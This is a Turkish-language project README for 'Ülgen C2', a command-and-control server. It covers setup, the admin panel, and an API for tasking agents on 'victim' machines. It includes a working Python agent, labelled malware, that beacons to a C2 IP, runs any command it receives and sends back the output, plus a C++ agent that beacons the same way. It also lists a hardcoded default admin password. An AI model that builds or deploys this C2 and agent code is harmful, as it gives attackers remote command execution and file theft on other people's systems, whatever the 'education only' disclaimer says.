🎯 Ülgen C2 - Komut Kontrol Sunucusu

https://img.shields.io/badge/version-2.0-blue
https://img.shields.io/badge/node-18%252B-green
https://img.shields.io/badge/license-MIT-orange

Ülgen C2, güvenlik testleri ve eğitim amaçlı geliştirilmiş, çift portlu bir Komut Kontrol (Command & Control) sunucusudur. Ajanları yönetmek, komut çalıştırmak ve dosya transferi yapmak için tasarlanmıştır.
📋 İçindekiler

    Özellikler

    Mimari Yapı

    Kurulum

    Kullanım

    API Dokümantasyonu

    Ajan (Malware) Geliştirme

    Güvenlik Uyarıları

    Sık Sorulan Sorular

✨ Özellikler
🔧 Temel Özellikler

    Çift Port Mimarisi: 443 (ajan iletişimi) ve 9998 (yönetici paneli)

    HTTPS Tabanlı: Tüm iletişim SSL/TLS ile şifrelenir

    Çoklu Ajan Desteği: Aynı anda birden fazla ajanı yönetebilme

    Gerçek Zamanlı Güncelleme: Server-Sent Events ile anlık ajan takibi

📁 Dosya Yönetimi

    Çift Yönlü Transfer: Ajan'dan sunucuya / sunucudan ajan'a dosya gönderme

    Base64 Encode: Büyük dosyalar için optimize edilmiş transfer

    Otomatik İndirme: Files sayfasında tek tıkla browser'a indirme

    Kalıcı Depolama: Sunucu restartında dosyalar kaybolmaz

🖥️ Yönetici Paneli

    Modern Arayüz: Koyu tema, yeşil neon renkler

    Canlı Ajan Listesi: Bağlı ajanları anlık görüntüleme

    Komut Terminali: Ajanlara direkt komut gönderme

    Dosya Gezgini: Tüm transfer edilen dosyaları listeleme

    Dizin Gezintisi: cd, ls, pwd komutları ile ajanın dosya sisteminde gezinme

🏗️ Mimari Yapı
text

┌─────────────────┐     443      ┌──────────────┐
│     Ajanlar     │ ◄─────────── │   C2 Sunucu  │
│  (Malware)      │              │  (Node.js)   │
└─────────────────┘              └──────┬───────┘
                                        │ 9998
                                   ┌────▼──────┐
                                   │ Yönetici  │
                                   │  Paneli   │
                                   └───────────┘

Port Yapısı
Port	Kullanım	Açıklama
443	Ajan API	Ajanların bağlandığı, komut alıp veri gönderdiği port
9998	Yönetici Paneli	Web arayüzü, ajan yönetimi ve dosya transferi
Klasör Yapısı
text

c2-server/
├── 📁 certs/                 # SSL sertifikaları
├── 📁 public/                 # Web arayüzü dosyaları
│   ├── 📄 login.html
│   ├── 📄 dashboard.html
│   └── 📄 files.html
├── 📁 uploads/                # Ajandan gelen dosyalar (kalıcı)
├── 📁 downloads/              # Ajana giden dosyalar (geçici)
├── 📄 server.js                # Ana sunucu kodu
├── 📄 package.json
└── 📄 README.md

🚀 Kurulum
Gereksinimler

    Node.js 18+

    npm veya yarn

    OpenSSL (sertifika oluşturmak için)

    sudo yetkisi (443 portu için)

Adım Adım Kurulum
bash

# 1. Repoyu klonla
git clone https://github.com/Subutay-CyberSecurity/Ulgen-Control-And-Commad-Server.git
cd Ulgen-Control-And-Commad-Server

# 2. Bağımlılıkları yükle
npm install

# 3. SSL sertifikası oluştur
mkdir certs
cd certs
openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes
# Common Name'e sunucu IP'ni yaz (örn: 192.168.1.45)
cd ..

# 4. Klasörleri oluştur
mkdir uploads downloads

# 5. Sunucuyu başlat
sudo node server.js

Docker ile Kurulum (Opsiyonel)
bash

# Dockerfile
FROM node:18
WORKDIR /app
COPY package*.json ./
RUN npm install
COPY . .
EXPOSE 443 9998
CMD ["node", "server.js"]

# Build ve run
docker build -t ulgen-c2 .
docker run -p 443:443 -p 9998:9998 -v $(pwd)/uploads:/app/uploads ulgen-c2

🎮 Kullanım
Yönetici Paneli

    Tarayıcından https://<sunucu_ip>:9998 adresine git

    Şifre: mow0BEBWgooxBLCiAVTm

    Dashboard: Ajanları görüntüle, komut gönder

    Files: Transfer edilen dosyaları indir

Komut Gönderme
text

whoami              - Kullanıcı adını öğren
ipconfig/ifconfig   - IP bilgilerini al
ls -la              - Dosyaları listele
cd /home/user       - Dizin değiştir
pwd                 - Mevcut dizini göster
upload file.txt     - Dosyayı sunucuya gönder
download file_id    - Sunucudan dosya indir
info                - Sistem bilgilerini getir
help                - Yardım menüsü

Dosya Transferi
📤 Ajan'a Dosya Gönderme (Admin → Ajan)

    Dashboard'da ajanı seç

    "DOSYA SEÇ" ile dosyayı seç

    "DOSYA GÖNDER" butonuna tıkla

📥 Ajandan Dosya Alma (Ajan → Admin)

    Dashboard'da ajanı seç

    "DOSYA YOLU" kısmına dosya yolunu yaz

    "DOSYA İSTE" butonuna tıkla

    Dosya otomatik browser'a iner

📡 API Dokümantasyonu
1. Ajan Kaydı
http

POST /api/game/register
Content-Type: application/json

{
    "playerId": "agent_pc_user_abc123",
    "playerName": "pc_user",
    "system_info": {
        "hostname": "victim-pc",
        "system": "Windows",
        "username": "user"
    }
}

2. Komut Kontrolü
http

GET /api/game/status/{agentId}

Response:
{
    "success": true,
    "gameData": {
        "command": "whoami",
        "command_id": "cmd_123456789_abc123"
    }
}

3. Komut Çıktısı Gönderme
http

POST /api/game/data
Content-Type: application/json

{
    "playerId": "agent_...",
    "action": "command_output",
    "data": {
        "command_id": "cmd_...",
        "command": "whoami",
        "output": "root\n"
    }
}

4. Dosya Yükleme
http

POST /api/agent/upload
Content-Type: application/json

{
    "agentId": "agent_...",
    "file": {
        "name": "file.txt",
        "size": 12345,
        "content": "base64_encoded_content"
    }
}

5. Dosya İndirme
http

GET /api/files/{fileId}/download
# Response: Binary file

🐍 Ajan (Malware) Geliştirme
Python Örneği
python

#!/usr/bin/env python3
import requests
import time
import subprocess
import base64
import platform
import uuid

SERVER = "https://192.168.1.45:443"
agent_id = f"agent_{platform.node()}_{uuid.uuid4().hex[:4]}"

# SSL uyarılarını kapat
import urllib3
urllib3.disable_warnings()

# Kayıt ol
requests.post(f"{SERVER}/api/game/register", 
              json={"playerId": agent_id},
              verify=False)

while True:
    # Komut kontrolü
    r = requests.get(f"{SERVER}/api/game/status/{agent_id}", verify=False)
    data = r.json().get('gameData', {})
    
    if 'command' in data:
        cmd = data['command']
        cmd_id = data['command_id']
        
        # Komut çalıştır
        result = subprocess.run(cmd, shell=True, 
                               capture_output=True, text=True)
        
        # Sonuç gönder
        requests.post(f"{SERVER}/api/game/data", json={
            "playerId": agent_id,
            "action": "command_output",
            "data": {
                "command_id": cmd_id,
                "command": cmd,
                "output": result.stdout or result.stderr
            }
        }, verify=False)
    
    time.sleep(3)

C++ Örneği (libcurl ile)
cpp

#include <iostream>
#include <curl/curl.h>
#include <nlohmann/json.hpp>

int main() {
    CURL* curl = curl_easy_init();
    std::string agent_id = "agent_" + getHostname();
    
    // Register
    std::string data = "{\"playerId\":\"" + agent_id + "\"}";
    curl_easy_setopt(curl, CURLOPT_URL, "https://192.168.1.45:443/api/game/register");
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, data.c_str());
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
    curl_easy_perform(curl);
    
    while(true) {
        // Command check
        std::string url = "https://192.168.1.45:443/api/game/status/" + agent_id;
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_HTTPGET, 1L);
        curl_easy_perform(curl);
        
        Sleep(3000);
    }
}

⚠️ Güvenlik Uyarıları
🔒 Önemli Notlar

    Bu araç sadece eğitim ve güvenlik testleri içindir

    İzinsiz kullanımı yasa dışıdır

    Kendi ağınızda veya izinli sistemlerde test edin

    Varsayılan şifreyi değiştirin (PASSWORD sabiti)

🔐 Güvenlik Önlemleri
javascript

// Varsayılan şifreyi değiştir
const PASSWORD = 'kendi_güçlü_şifren';

// SSL sertifikalarını güvende tut
chmod 600 certs/key.pem

📝 Production İpuçları

    Güçlü bir SSL sertifikası kullanın (Let's Encrypt)

    Rate limiting ekleyin

    İzleme ve loglama yapın

    Düzenli yedekleme alın

    Güvenlik duvarında sadece gerekli portları açın

❓ Sık Sorulan Sorular
Sunucu başlamıyor, "EACCES" hatası alıyorum?

443 portu için root yetkisi gerekir:
bash

sudo node server.js

Dosyalar gözükmüyor, restart'ta sıfırlanıyor?

Yeni versiyonda uploads/ klasörü taranır. Eski dosyalar için:
bash

# Uploads klasörünü kontrol et
ls -la uploads/
# Dosyalar varsa, server.js'de scanUploadsFolder() çalışıyor mu kontrol et

Ajan bağlanamıyor, SSL hatası alıyorum?

Self-signed sertifika kullanıyorsan verify=False kullan:
python

requests.get(url, verify=False)

Performance için öneriler?

    CHECK_INTERVAL = 3 (çok sık kontrol etmeyin)

    Dosya limiti: 500mb (çok büyük dosyalar sorun çıkarır)

    Heartbeat: 60 saniye (trafiği azaltır)

🤝 Katkıda Bulunma

    Fork'la

    Feature branch oluştur (git checkout -b yeni-ozellik)

    Değişiklikleri commit et (git commit -am 'Yeni özellik eklendi')

    Branch'i pushla (git push origin yeni-ozellik)

    Pull Request aç

📞 İletişim

    GitHub: @Subutay-CyberSecurity

📜 Lisans

Bu proje MIT lisansı ile lisanslanmıştır. Detaylar için LICENSE dosyasına bakın.
